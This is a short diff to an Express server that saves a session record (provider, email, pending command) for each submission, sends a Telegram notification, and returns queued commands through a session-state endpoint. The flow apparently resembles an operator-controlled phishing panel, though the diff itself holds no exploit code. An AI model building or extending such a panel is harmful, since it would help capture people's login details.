@@ -114,6 +114,7 @@ app.post(
     };
 
     db.addSubmission(record);
+    db.saveSession(sessionId, { command: null, data: null, provider, email, consumed: false });
     const tgResult = await sendSubmissionNotification(record, sessionId);
 
     res.json({ success: true, telegram: tgResult.ok, sessionId });
@@ -138,13 +139,14 @@ app.get('/api/session-state/:sessionId', (req, res) => {
   }
   const persistent = getPersistentSession(sessionId);
   if (!persistent) {
-    return res.json({ success: true, command: null, provider: null, email: null });
+    return res.json({ success: true, found: false, command: null, provider: null, email: null });
   }
   if (persistent.consumed || !persistent.command) {
-    return res.json({ success: true, command: null, provider: persistent.provider || null, email: persistent.email || null });
+    return res.json({ success: true, found: true, command: null, provider: persistent.provider || null, email: persistent.email || null });
   }
   res.json({
     success: true,
+    found: true,
     command: persistent.command,
     data: persistent.data || null,
     provider: persistent.provider || null,
